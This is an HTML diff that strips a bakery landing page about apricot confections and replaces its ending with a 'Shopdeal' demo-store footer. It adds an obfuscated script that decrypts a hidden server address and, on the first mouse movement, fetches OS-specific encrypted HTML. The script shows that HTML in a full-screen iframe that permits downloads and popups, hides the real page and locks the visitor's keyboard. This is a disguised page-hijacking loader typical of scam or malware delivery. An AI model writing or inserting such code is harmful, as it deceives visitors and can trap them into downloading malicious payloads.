-          At our Mercer Street kitchen in Manhattan, every batch of confiture is simmered in wide-lipped, solid red copper preserving basins forged in Villedieu-les-Po&ecirc;les. Copper conducts heat twenty-five times faster than stainless steel, distributing BTU output instantaneously across the entire vessel base.
-        </p>
-        <p style="margin-bottom:1.5rem;color:var(--color-text-muted);">
-          This immediate heat transfer flash-evaporates excess fruit water in minutes rather than hours, halting the destruction of volatile fruit aromatics. Furthermore, microscopic copper ions bind gently to natural stone fruit pectins, creating a resilient three-dimensional mesh that sets our jams with thirty percent less added sugar.
-        </p>
-        <ul style="list-style:none;display:flex;flex-direction:column;gap:0.75rem;font-family:var(--font-mono);font-size:0.88rem;color:var(--color-primary);">
-          <li>&#10003; 100% natural fruit pectin from whole citrus and apple cores</li>
-          <li>&#10003; Zero artificial preservatives, colorants, or corn syrups</li>
-          <li>&#10003; Flash boiling under 12 minutes to preserve bright orange beta-carotene</li>
-        </ul>
-      </div>
-      <div style="border-radius:var(--radius-md);overflow:hidden;box-shadow:var(--shadow-lg);">
-        <img src="assets/images/blog_apricot_pectin_preserves_confiture.jpg" alt="Simmering apricot confiture in copper preserving cauldron">
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 6: Tailoring Anatomy & Frangipane -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Pâtisserie Architecture</span>
-      <h2 class="section-title">Anatomy of an Heirloom Apricot Tart</h2>
-      <p class="section-lead">
-        Explore the thermodynamic and culinary layering that distinguishes our handcrafted pastries from commercial bakery confections.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div class="pillar-card">
-        <img src="assets/images/blog_apricot_patisserie_pastry_lamination.jpg" alt="Laminated pastry dough preparation" style="border-radius:var(--radius-sm);margin-bottom:1.25rem;height:180px;width:100%;object-fit:cover;">
-        <h3 class="pillar-title">Puff Pastry Lamination</h3>
-        <p class="pillar-text">
-          Folded into six distinct turns yielding hundreds of micro-butter layers. During baking, steam separates each sheet into a crisp, caramelized golden crust.
-        </p>
-      </div>
-      <div class="pillar-card">
-        <img src="assets/images/apricot_kernel_praline_honey_roasted.jpg" alt="Sweet roasted apricot kernel praline" style="border-radius:var(--radius-sm);margin-bottom:1.25rem;height:180px;width:100%;object-fit:cover;">
-        <h3 class="pillar-title">Sweet Apricot Kernel Praline</h3>
-        <p class="pillar-text">
-          Finely ground sweet apricot kernels and Sicilian almonds creamed with farm butter and eggs, providing an aromatic marzipan cushion beneath the tart fruit.
-        </p>
-      </div>
-      <div class="pillar-card">
-        <img src="assets/images/apricot_puree_glaze_reduction.jpg" alt="Simmered apricot glaze reduction" style="border-radius:var(--radius-sm);margin-bottom:1.25rem;height:180px;width:100%;object-fit:cover;">
-        <h3 class="pillar-title">Pure Orchard Glaze</h3>
-        <p class="pillar-text">
-          A mirror-like reduction of concentrated apricot juice and Madagascar vanilla bean brushed hot over oven-fresh tarts to seal moisture and enhance shine.
-        </p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 7: Visual Archive Gallery -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Kitchen Archive</span>
-      <h2 class="section-title">The Mercer Street Pâtisserie Gallery</h2>
-      <p class="section-lead">
-        A photographic journey through stone fruit orchard harvests, copper pan cooking, pastry lamination, and gourmet dessert plating.
-      </p>
-    </div>
-    <div class="grid-4">
-      <div style="border-radius:var(--radius-sm);overflow:hidden;box-shadow:var(--shadow-sm);height:220px;">
-        <img src="assets/images/about_sunlit_apricot_orchard_harvest.jpg" alt="Sunlit apricot orchard harvest" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-      <div style="border-radius:var(--radius-sm);overflow:hidden;box-shadow:var(--shadow-sm);height:220px;">
-        <img src="assets/images/apricot_flambee_caramelization_pan.jpg" alt="Apricot copper pan caramelization" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-      <div style="border-radius:var(--radius-sm);overflow:hidden;box-shadow:var(--shadow-sm);height:220px;">
-        <img src="assets/images/lookbook_apricot_patisserie_presentation.jpg" alt="Apricot pastry table presentation" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-      <div style="border-radius:var(--radius-sm);overflow:hidden;box-shadow:var(--shadow-sm);height:220px;">
-        <img src="assets/images/apricot_patisserie_plating_art.jpg" alt="Gourmet apricot dessert plating" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 8: Patron Commendations -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Epicurean Commendations</span>
-      <h2 class="section-title">Voices from Confectionery Connoisseurs</h2>
-      <p class="section-lead">
-        Reflections from culinary critics, pastry chefs, and guests who have experienced our stone fruit confections.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div class="pillar-card">
-        <p style="font-style:italic;margin-bottom:1.5rem;color:var(--color-text);">
-          "The Blenheim apricot tart is an absolute masterpiece of acid-sweet equilibrium. The flakiness of the butter crust paired with the intense tartness of the fruit is unmatched in New York."
-        </p>
-        <div style="font-family:var(--font-mono);font-size:0.85rem;color:var(--color-accent);font-weight:700;">
-          Genevieve Moreau &bull; Gastronomic Critic
-        </div>
-      </div>
-      <div class="pillar-card">
-        <p style="font-style:italic;margin-bottom:1.5rem;color:var(--color-text);">
-          "Tasting their copper kettle Malatya confiture was like rediscovering what an apricot actually tastes like. The velvety texture and lack of artificial pectin shine through immediately."
-        </p>
-        <div style="font-family:var(--font-mono);font-size:0.85rem;color:var(--color-accent);font-weight:700;">
-          Chef Marcus Thorne &bull; Pâtisserie Guild Member
-        </div>
-      </div>
-      <div class="pillar-card">
-        <p style="font-style:italic;margin-bottom:1.5rem;color:var(--color-text);">
-          "The private tasting salon at 181 Mercer Street was an unforgettable experience. Learning the pomological history of Blenheim apricots while savoring warm soufflé glacé was pure culinary joy."
-        </p>
-        <div style="font-family:var(--font-mono);font-size:0.85rem;color:var(--color-accent);font-weight:700;">
-          Victoria Sterling &bull; Food Historian
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 9: Bespoke Banquet & Catering Workflow -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Culinary Process</span>
-      <h2 class="section-title">Our Four-Stage Pâtisserie Commission</h2>
-      <p class="section-lead">
-        From orchard fruit grading to your private dessert banquet service at 181 Mercer Street.
-      </p>
-    </div>
-    <div class="grid-4">
-      <div class="pillar-card">
-        <div class="pillar-num">Step 1</div>
-        <h4 style="font-size:1.15rem;margin-bottom:0.5rem;">Orchard Selection</h4>
-        <p style="font-size:0.9rem;color:var(--color-text-muted);">
-          Consult with our pastry chefs to select specific stone fruit terroirs matching your banquet flavor profile.
-        </p>
-      </div>
-      <div class="pillar-card">
-        <div class="pillar-num">Step 2</div>
-        <h4 style="font-size:1.15rem;margin-bottom:0.5rem;">Kettle Formulation</h4>
-        <p style="font-size:0.9rem;color:var(--color-text-muted);">
-          Confitures and purées are simmered in French copper cauldrons with botanical herbs and organic spices.
-        </p>
-      </div>
-      <div class="pillar-card">
-        <div class="pillar-num">Step 3</div>
-        <h4 style="font-size:1.15rem;margin-bottom:0.5rem;">Artisan Lamination</h4>
-        <p style="font-size:0.9rem;color:var(--color-text-muted);">
-          Our bakers roll high-fat butter dough, assembling individual tarts and confections hours before your event.
-        </p>
-      </div>
-      <div class="pillar-card">
-        <div class="pillar-num">Step 4</div>
-        <h4 style="font-size:1.15rem;margin-bottom:0.5rem;">Salon Service</h4>
-        <p style="font-size:0.9rem;color:var(--color-text-muted);">
-          Delivered or presented at our Manhattan salon with chilled botanical stone fruit reductions and warm glazes.
-        </p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 10: Frequently Asked Questions -->
-<section class="section">
-  <div class="container-narrow">
-    <div class="section-header">
-      <span class="section-tag">Inquiries</span>
-      <h2 class="section-title">Artisanal Confectionery FAQs</h2>
-      <p class="section-lead">
-        Essential answers regarding stone fruit varieties, copper kettle cooking, and private tasting salon reservations.
-      </p>
-    </div>
-    <div class="faq-list">
-      <div class="faq-item active">
-        <button class="faq-question">
-          <span>What makes Blenheim apricots different from commercial supermarket apricots?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Commercial apricots are bred for tough skin and long transport durability, often harvested green with little flavor. In contrast, California Blenheim apricots are delicate, thin-skinned heirloom drupes with an intense aromatic perfume and a perfect natural balance of sweet sucrose and sharp malic acid.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>Do you use artificial pectins or gelatin in your apricot preserves?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Never. We utilize only the natural pectin present in fresh apricots, supplemented when necessary with house-extracted pectin from green organic apple cores and Meyer lemon seeds. All our confitures are 100% plant-based and free of synthetic stabilizers.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>Can I schedule a private tasting salon experience at 181 Mercer Street?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Yes. Our intimate tasting room in New York offers curated multi-course apricot dessert flights from Wednesday through Sunday. Private seatings can be booked in advance by calling +1-888-777-5845 or through our online salon contact portal.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>How long do your copper-kettle confitures keep after opening?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Because our confitures are cooked to a natural 66-degree Brix and sterilized in glass jars, unopened jars retain peak quality for over eighteen months. Once opened, store in the refrigerator and enjoy within four to six weeks.
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- Section 11: Journal Treatises Preview -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Culinary Science</span>
-      <h2 class="section-title">From the Pâtisserie Research Desk</h2>
-      <p class="section-lead">
-        Scholarly culinary monographs on pectin gelation chemistry, solar fruit dehydration, and the physics of puff pastry lamination.
-      </p>
-    </div>
-    <div class="grid-3">
-            <div class="card">
-        <div class="card-img">
-          <img src="assets/images/blog_apricot_pectin_preserves_confiture.jpg" alt="Botanical Pectin Gelation & pH Acidity Balance in Heirloom Confiture">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Treatise &bull; 15 min read</span>
-          <h3 class="card-title"><a href="blog/botanical-pectin-gelation-apricot-confiture.html">Botanical Pectin Gelation & pH Acidity Balance in Heirloom Confiture</a></h3>
-          <p class="card-desc">An exhaustive food chemistry study on high-methoxyl stone fruit pectin, sucrose crystallization barriers, and thermal coagulation in pure apricot jams.</p>
-          <div style="margin-top:auto;display:flex;justify-content:space-between;align-items:center;font-family:var(--font-mono);font-size:0.8rem;color:var(--color-text-muted);">
-            <span>Chef Laurent Mercier</span>
-            <span>&rarr;</span>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
           </div>
         </div>
       </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/blog_malatya_sun_dried_apricot_history.jpg" alt="Malatya Sun-Drying Science: Polyphenol Oxidase & Carotenoid Retention">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Treatise &bull; 14 min read</span>
-          <h3 class="card-title"><a href="blog/malatya-sun-dried-apricots-enzymatic-browning.html">Malatya Sun-Drying Science: Polyphenol Oxidase & Carotenoid Retention</a></h3>
-          <p class="card-desc">Biochemical investigation into traditional solar dehydration, beta-carotene stability, and enzymatic browning suppression in Turkish sun-dried apricots.</p>
-          <div style="margin-top:auto;display:flex;justify-content:space-between;align-items:center;font-family:var(--font-mono);font-size:0.8rem;color:var(--color-text-muted);">
-            <span>Dr. Aris Thorne</span>
-            <span>&rarr;</span>
-          </div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/blog_heirloom_apricot_botany_terroir.jpg" alt="The Fragile Majesty of Blenheim Apricots: Terroir & Malic Acid Ratios">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Treatise &bull; 13 min read</span>
-          <h3 class="card-title"><a href="blog/blenheim-apricot-terroir-california-valley.html">The Fragile Majesty of Blenheim Apricots: Terroir & Malic Acid Ratios</a></h3>
-          <p class="card-desc">A pomological exploration of California heritage orchards, chilling hour requirements, and the unparalleled sweet-tart flavor balance of Blenheim drupes.</p>
-          <div style="margin-top:auto;display:flex;justify-content:space-between;align-items:center;font-family:var(--font-mono);font-size:0.8rem;color:var(--color-text-muted);">
-            <span>Margot Delacroix</span>
-            <span>&rarr;</span>
-          </div>
-        </div>
-      </div>
+    </section>
 
-    </div>
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-</section>
 
-<!-- Section 12: Newsletter Dispatch -->
-<section class="section" style="background:var(--color-primary);color:#FFFFFF;text-align:center;">
-  <div class="container-narrow">
-    <span class="section-tag" style="color:var(--color-accent);">&#10022; Pâtisserie Dispatches</span>
-    <h2 class="section-title" style="color:#FFFFFF;margin-bottom:1rem;">Join the ApricotTreat Guild</h2>
-    <p style="color:#EFE4D2;font-size:1.1rem;margin-bottom:2.25rem;">
-      Receive seasonal harvest bulletins, limited confiture release allocations, and private tasting invitations directly from our Mercer Street kitchen.
-    </p>
-    <form style="display:flex;gap:1rem;max-width:520px;margin:0 auto;flex-wrap:wrap;" onsubmit="event.preventDefault();alert('Thank you for subscribing to the ApricotTreat Guild dispatch.');this.reset();">
-      <input type="email" placeholder="Enter your email address" required style="flex-grow:1;padding:0.85rem 1.25rem;border-radius:var(--radius-sm);border:none;outline:none;font-size:0.95rem;">
-      <button type="submit" class="btn-primary" style="background:var(--color-accent);color:#FFFFFF;border:none;">Subscribe</button>
-    </form>
-    <p style="font-family:var(--font-mono);font-size:0.8rem;color:#CBB9A8;margin-top:1.25rem;">
-      Direct telephone inquiries: <a href="tel:+18887775845" style="color:#FFFFFF;">+1-888-777-5845</a> &bull; 181 Mercer Street, NYC
-    </p>
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
   </div>
-</section>
-  <footer class="site-footer">
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-brand">
-          <h3>ApricotTreat</h3>
-          <p>
-            An artisanal pâtisserie atelier dedicated to sun-ripened Malatya and Blenheim apricot confections, traditional copper kettle preserves, and classical French frangipane tarts. Handcrafted with orchard integrity at 181 Mercer Street.
-          </p>
-          <p style="font-family:var(--font-mono);font-size:0.85rem;color:var(--color-accent);">
-            Est. 2024 &bull; Mercer Street Pâtisserie Guild
-          </p>
-        </div>
-        <div class="footer-col">
-          <h4>Atelier Pages</h4>
-          <ul class="footer-links">
-            <li><a href="index.php">Confectionery Menu</a></li>
-            <li><a href="about.html">Orchard Provenance</a></li>
-            <li><a href="blog.html">Culinary Treatises</a></li>
-            <li><a href="contact.html">Private Tasting Salon</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Legal Governance</h4>
-          <ul class="footer-links">
-            <li><a href="privacy-policy.html">Privacy Policy</a></li>
-            <li><a href="terms-and-conditions.html">Terms &amp; Conditions</a></li>
-            <li><a href="disclaimer.html">Culinary Disclaimer</a></li>
-            <li><a href="cookie-policy.html">Cookie Policy</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Manhattan Tasting Salon</h4>
-          <div class="footer-contact-item">
-            <span>&#9906;</span>
-            <span>181 Mercer Street, New York, NY 10012, United States</span>
-          </div>
-          <div class="footer-contact-item">
-            <span>&#9742;</span>
-            <span><a href="tel:+18887775845" style="color:#FFFFFF;">+1-888-777-5845</a></span>
-          </div>
-          <div class="footer-contact-item">
-            <span>&#9201;</span>
-            <span>Wednesday &ndash; Sunday: 11:00 &ndash; 19:00 EST</span>
-          </div>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <div>&copy; 2026 ApricotTreat Confectionery LLC. All rights reserved. Artisanal orchard delicacies.</div>
-        <div style="font-family:var(--font-mono);font-size:0.8rem;">181 Mercer Street &bull; New York, NY 10012</div>
-      </div>
-    </div>
-  </footer>
-  <script src="assets/js/main.js"></script>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX18k+G0kjyj75mMlfCkTzeNC+gcXJAVHFELnXrHVMUxcQe75KNXpm1mT";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
